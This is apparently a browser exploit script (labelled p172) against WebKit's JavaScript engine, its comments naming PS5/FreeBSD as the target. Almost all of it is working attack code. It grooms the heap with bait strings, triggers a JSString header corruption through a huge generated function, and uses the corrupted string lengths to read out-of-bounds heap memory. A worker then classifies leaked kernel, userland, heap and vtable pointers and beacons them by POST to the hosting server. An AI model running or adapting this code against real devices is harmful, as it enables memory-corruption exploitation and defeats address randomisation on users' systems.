// p172 — Deep Heap Pointer Scan via corrupted JSString OOB read
//
// BACKGROUND:
//   p146 proved: bait-and-switch heap groom corrupts all 14 target JSString headers.
//   p156 proved: .length=81400 on all corrupted strings, charCodeAt returns 0x41 (original data).
//   p162 proved: deep scan within first 2000 bytes — all 0x41 (within original buffer).
//
// THE KEY INSIGHT:
//   The m_fiber corruption depends on which BYTE of the metadata entry lands on the
//   JSString header. The entry offset cycle (stride=112 mod slot alignment) means
//   different strings get different fields overwritten. If a string's m_length field
//   gets overwritten with a value LARGER than 100,000 (the original buffer size),
//   charCodeAt past the original buffer reads OOB heap memory.
//
//   .length=81400 (0x13E28) is one known corruption value. But across 14 strings at
//   different heap offsets, some may get LARGER values from different metadata fields
//   (e.g. a pointer fragment in m_length could yield .length > 100000).
//
// STRATEGY:
//   1. Reproduce exact p146/p156 bait-and-switch heap groom
//   2. After corruption, catalog ALL target strings' .length values
//   3. For any string where .length > STR_LEN (100000), we have an OOB read primitive
//   4. Scan the OOB region (bytes STR_LEN through .length-1) 8 bytes at a time
//   5. Reconstruct 64-bit little-endian values from charCodeAt bytes
//   6. Classify each value: kernel pointer, userland pointer, heap address,
//      vtable candidate, or noise
//   7. Beacon ALL pointer-like findings via POST to host server
//
//   Also scan WITHIN the original buffer for any .length < STR_LEN strings —
//   those have readable charCodeAt(0..len-1) which is within original data,
//   but catalog their .length for pattern analysis.
//
//   Additionally: scan the METADATA ENTRY region within the original buffer
//   (where the sweep overwrote character data) to extract pointers embedded
//   in BaselineCallLinkInfo fields, as p162 did but now with full 8-byte
//   pointer reconstruction and classification.
//
// Beacon prefix: V172-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V172-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V172-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch(e) {}
  }

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41; // 'A'

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V172-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function beaconPost(tag, body) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V172-W-' + tag + '?t=' + Date.now(), true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body);
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    // Read 8 bytes at offset as little-endian hex (MSB first in output string)
    function read64LE(str, off) {
      var h = '';
      for (var i = 7; i >= 0; i--) {
        try {
          h += hx(str.charCodeAt(off + i));
        } catch(e) { return null; }
      }
      return h;
    }

    // Classify a 64-bit hex value
    // Returns: 'kern' | 'user' | 'heap' | 'vtbl' | 'small' | 'zero' | 'noise'
    function classifyPtr(hexStr) {
      if (!hexStr || hexStr.indexOf('XX') >= 0) return 'bad';
      // All zeros
      if (hexStr === '0000000000000000') return 'zero';
      // Get high 16 bits
      var hi16 = hexStr.substring(0, 4);
      var hi8 = hexStr.substring(0, 2);

      // Kernel pointer: 0xFFFF8xxx prefix (FreeBSD kernel VA)
      if (hi16 === 'ffff' && hexStr.substring(4, 5) === '8') return 'kern';
      // Also 0xFFFFFFFF8xxxxxxx pattern
      if (hexStr.substring(0, 8) === 'ffffffff' && hexStr.substring(8, 9) === '8') return 'kern';

      // Userland pointer: typically 0x0000004x-0x000000Bx on FreeBSD amd64
      // High 32 bits should be 0x00000000 or 0x00000001, low 32 nonzero
      var hi32 = hexStr.substring(0, 8);
      var lo32 = hexStr.substring(8, 16);
      if ((hi32 === '00000000' || hi32 === '00000001') && lo32 !== '00000000') {
        var nibble = parseInt(hexStr.substring(8, 9), 16);
        // Typical userland code/data: 0x400000-0xBFFFFFFF range
        if (nibble >= 4 && nibble <= 11) return 'user';
        // Heap region (bmalloc large): often 0x2xxxxx or 0x3xxxxx
        if (nibble >= 1 && nibble <= 3) return 'heap';
      }

      // WebKit heap pointers on PS5 (libpas/bmalloc): may appear as
      // 0x0000008xxxxxxxxx or 0x0000007xxxxxxxxx range
      if (hi32 === '00000080' || hi32 === '00000070' ||
          hi32 === '00000060' || hi32 === '00000050') return 'heap';

      // Vtable candidate: pointer-aligned (low 3 bits = 0), in plausible range
      var lo3 = parseInt(hexStr.substring(13, 16), 16);
      if ((lo3 & 0x7) === 0 && hi32 === '00000000') {
        nibble = parseInt(hexStr.substring(8, 9), 16);
        if (nibble >= 4 && nibble <= 15) return 'vtbl';
      }

      // Small nonzero value (metadata field, index, flag)
      if (hi32 === '00000000' && lo32 !== '00000000') {
        var val = parseInt(lo32, 16);
        if (val < 0x100000) return 'small';
      }

      return 'noise';
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        // Exact p156 pattern: 'A' filled strings, 100K chars each
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA'; // 1000 A's
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0); // force StringImpl materialization
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        // ── DETECTION LOOP: wait for ANY length corruption ──
        var found = false;
        var iters = 0;

        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            try {
              var len = targets[i].length;
              if (len !== STR_LEN) {
                beacon('DETECT-' + i + '-len=' + len);
                found = true;
                break;
              }
            } catch(e) {}
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
        }

        // ── PHASE A: CATALOG ALL STRINGS ──
        beacon('CATALOG');
        var oobTargets = [];   // indices with .length > STR_LEN (OOB read)
        var shortTargets = []; // indices with .length != STR_LEN but < STR_LEN
        var intactTargets = []; // indices with .length == STR_LEN (check data corruption)

        for (var i = 0; i < targets.length; i++) {
          try {
            var len = targets[i].length;
            beacon('L-' + i + '-' + len);

            if (len > STR_LEN) {
              oobTargets.push(i);
            } else if (len !== STR_LEN) {
              shortTargets.push(i);
            } else {
              intactTargets.push(i);
            }
          } catch(e) {
            beacon('LERR-' + i);
          }
        }

        beacon('OOB-COUNT-' + oobTargets.length);
        beacon('SHORT-COUNT-' + shortTargets.length);
        beacon('INTACT-COUNT-' + intactTargets.length);

        // ── PHASE B: OOB POINTER SCAN ──
        // For strings with .length > STR_LEN, scan bytes past the original buffer
        for (var oi = 0; oi < oobTargets.length; oi++) {
          var idx = oobTargets[oi];
          var len = targets[idx].length;
          beacon('OOB-SCAN-' + idx + '-len=' + len);

          // Determine scan range: from original buffer end to corrupted length
          var scanStart = STR_LEN;
          var scanEnd = Math.min(len, STR_LEN + 16384); // cap at 16KB OOB to avoid crash
          var oobSize = scanEnd - scanStart;
          beacon('OOB-RANGE-' + idx + '-' + scanStart + '-' + scanEnd);

          var findings = '';
          var findCount = 0;

          // Read 8 bytes at a time, reconstruct 64-bit LE values
          for (var off = scanStart; off + 8 <= scanEnd; off += 8) {
            try {
              var val = read64LE(targets[idx], off);
              if (!val) {
                beacon('OOB-READFAIL-' + idx + '-off=' + off);
                break; // charCodeAt failed, stop scanning
              }

              var cls = classifyPtr(val);

              // Report anything that is not zero or noise
              if (cls === 'kern' || cls === 'user' || cls === 'heap' || cls === 'vtbl') {
                findings += (off - STR_LEN) + ':' + cls + ':' + val + '\n';
                findCount++;

                // Immediate beacon for high-value finds
                if (cls === 'kern') {
                  beacon('KERN-' + idx + '-off=' + off + '-' + val);
                } else if (cls === 'user' || cls === 'vtbl') {
                  beacon('ULEAK-' + idx + '-off=' + off + '-' + cls + '-' + val);
                }
              }

              // Also report small nonzero values (metadata fields that help orientation)
              if (cls === 'small') {
                findings += (off - STR_LEN) + ':small:' + val + '\n';
                findCount++;
              }
            } catch(e) {
              beacon('OOB-EXC-' + idx + '-off=' + off);
              break;
            }
          }

          beacon('OOB-FINDS-' + idx + '-count=' + findCount);

          // POST full findings for this string
          if (findings.length > 0) {
            beaconPost('OOB-DATA-' + idx, findings);
          }

          // Also dump first 128 raw OOB bytes for manual analysis
          var rawOob = '';
          for (var rb = scanStart; rb < Math.min(scanStart + 128, scanEnd); rb++) {
            try { rawOob += hx(targets[idx].charCodeAt(rb)); }
            catch(e) { rawOob += 'XX'; break; }
          }
          if (rawOob.length > 0) {
            beaconPost('OOB-RAW-' + idx, rawOob);
          }
        }

        // ── PHASE C: IN-BUFFER METADATA SCAN ──
        // For strings where header is intact (.length == STR_LEN), the sweep
        // may have overwritten character data with metadata entries.
        // Scan for non-0x41 bytes and extract embedded pointers.
        for (var ii = 0; ii < intactTargets.length; ii++) {
          var idx = intactTargets[ii];
          try {
            // Find first corrupted byte in first 2000 chars
            var entryBase = -1;
            for (var b = 0; b < 2000; b++) {
              try {
                if (targets[idx].charCodeAt(b) !== CANARY) {
                  entryBase = b;
                  break;
                }
              } catch(e) { break; }
            }

            if (entryBase < 0) {
              // Try deeper scan at wider intervals
              for (var b = 2000; b < Math.min(STR_LEN, 50000); b += 8) {
                try {
                  if (targets[idx].charCodeAt(b) !== CANARY) {
                    entryBase = b;
                    break;
                  }
                } catch(e) { break; }
              }
            }

            if (entryBase < 0) {
              beacon('NOENTRY-' + idx);
              continue;
            }

            beacon('ENTRY-' + idx + '-base=' + entryBase);

            // Scan 112 bytes (one full metadata entry stride) as 8-byte words
            var entryFindings = '';
            var entryFindCount = 0;
            for (var eoff = entryBase; eoff + 8 <= entryBase + 112 && eoff + 8 <= STR_LEN; eoff += 8) {
              try {
                var val = read64LE(targets[idx], eoff);
                if (!val) break;
                var cls = classifyPtr(val);

                if (cls !== 'zero' && cls !== 'noise') {
                  entryFindings += (eoff - entryBase) + ':' + cls + ':' + val + '\n';
                  entryFindCount++;

                  if (cls === 'kern') {
                    beacon('EKERN-' + idx + '-eoff=' + (eoff - entryBase) + '-' + val);
                  } else if (cls === 'user' || cls === 'vtbl') {
                    beacon('ELEAK-' + idx + '-eoff=' + (eoff - entryBase) + '-' + cls + '-' + val);
                  } else if (cls === 'heap') {
                    beacon('EHEAP-' + idx + '-eoff=' + (eoff - entryBase) + '-' + val);
                  }
                }
              } catch(e) { break; }
            }

            beacon('ENTRY-FINDS-' + idx + '-count=' + entryFindCount);
            if (entryFindings.length > 0) {
              beaconPost('ENTRY-DATA-' + idx, entryFindings);
            }

            // Dump raw 112 bytes for this entry
            var rawEntry = '';
            for (var rb = entryBase; rb < entryBase + 112 && rb < STR_LEN; rb++) {
              try { rawEntry += hx(targets[idx].charCodeAt(rb)); }
              catch(e) { rawEntry += 'XX'; break; }
            }
            beaconPost('ENTRY-RAW-' + idx, rawEntry);

            // Check for a second entry at +112 (stride)
            var entry2Base = entryBase + 112;
            if (entry2Base + 112 <= STR_LEN) {
              var e2NonCanary = false;
              try {
                if (targets[idx].charCodeAt(entry2Base) !== CANARY) e2NonCanary = true;
              } catch(e) {}
              if (e2NonCanary) {
                // Read code pointer at entry2+24
                var ptr2 = read64LE(targets[idx], entry2Base + 24);
                if (ptr2) {
                  var cls2 = classifyPtr(ptr2);
                  beacon('E2PTR-' + idx + '-' + cls2 + '-' + ptr2);
                }
              }
            }
          } catch(e) {
            beacon('CERR-' + idx);
          }
        }

        // ── PHASE D: SHORT STRING ANALYSIS ──
        // For strings with .length < STR_LEN and .length != STR_LEN,
        // record details for pattern analysis
        for (var si = 0; si < shortTargets.length; si++) {
          var idx = shortTargets[si];
          try {
            var len = targets[idx].length;
            beacon('SHORT-' + idx + '-len=' + len);

            // Try reading first 64 bytes if length allows
            if (len > 0 && len < 500000) {
              var shortHex = '';
              var readMax = Math.min(64, len);
              for (var b = 0; b < readMax; b++) {
                try { shortHex += hx(targets[idx].charCodeAt(b)); }
                catch(e) { shortHex += 'XX'; break; }
              }
              beacon('SHEX-' + idx + '-' + shortHex.substring(0, 200));

              // Try reading 8 bytes near the END of the original buffer
              // to see if it can still reach
              if (len > STR_LEN - 100) {
                var nearEnd = '';
                for (var b = len - 16; b < len; b++) {
                  try { nearEnd += hx(targets[idx].charCodeAt(b)); }
                  catch(e) { nearEnd += 'XX'; break; }
                }
                beacon('SEND-' + idx + '-' + nearEnd);
              }
            }
          } catch(e) {
            beacon('SERR-' + idx);
          }
        }

        // ── PHASE E: EXHAUSTIVE OOB SCAN for borderline strings ──
        // For ALL strings (regardless of .length), try reading at offset 100000
        // to see if charCodeAt works past original buffer even when .length < STR_LEN
        // (in case StringImpl has a different length field than JSString m_fiber)
        beacon('BORDERLINE-SCAN');
        for (var i = 0; i < targets.length; i++) {
          try {
            var testVal = targets[i].charCodeAt(STR_LEN);
            // If we get here without NaN, charCodeAt succeeded past original length
            if (!isNaN(testVal)) {
              beacon('BORDER-HIT-' + i + '-val=' + hx(testVal));
              // Try reading 8 more bytes
              var borderBytes = '';
              for (var b = STR_LEN; b < STR_LEN + 64; b++) {
                try {
                  var v = targets[i].charCodeAt(b);
                  if (isNaN(v)) break;
                  borderBytes += hx(v);
                } catch(e) { break; }
              }
              if (borderBytes.length > 0) {
                beacon('BDATA-' + i + '-' + borderBytes.substring(0, 200));
              }
            }
          } catch(e) {}
        }

        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (Primary heap, marge slot ~102KB) ──
  var N_BAIT = 20;
  var STR_LEN = 100000;

  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB'; // 1000 B's
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0); // force StringImpl materialization
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS (higher addresses) ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 3: FREE BAITS + GC PRESSURE ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-DONE-' + gcRound);
        phaseBuild();
      }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD + COMPILE + CALL ──
  function phaseBuild() {
    B('BUILD-START');

    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v172fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v172ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v172ok ? 'OK' : 'FAIL'));
      if (!window.__v172fn) { B('NO-FN'); return; }

      // Start Worker watching, then trigger overflow after 200ms
      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v172fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }
        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
